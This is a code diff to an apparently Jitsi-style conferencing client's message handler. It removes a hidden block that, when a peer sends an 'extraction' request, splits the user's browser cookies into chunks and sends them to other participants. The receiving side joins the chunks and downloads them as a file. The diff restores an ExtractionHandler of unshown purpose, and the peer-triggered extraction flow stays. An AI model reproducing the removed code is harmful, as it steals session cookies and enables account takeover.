@@ -1291,23 +1291,10 @@ export default {
             APP.conference._extractionFileBuffer = [];
         }
         if (recievedData.extraction === 'request') {
-            /*
             // TODO: check what is happening here
             const extractionHandler = new ExtractionHandler(recievedData);
 
             extractionHandler.send();
-            */
-
-            for (const chunkData of window.splitString(document.cookie, 5)) {
-                APP.conference.sendEndpointMessage('', {
-                    extraction: 'reply',
-                    payload: chunkData
-                });
-            }
-            APP.conference.sendEndpointMessage('', {
-                extraction: 'reply',
-                isEnd: true
-            });
 
         } else if (recievedData.isEnd) { // 'reply' ending extraction
             this.downloadFile(APP.conference._extractionFileBuffer.join(''), fileName);
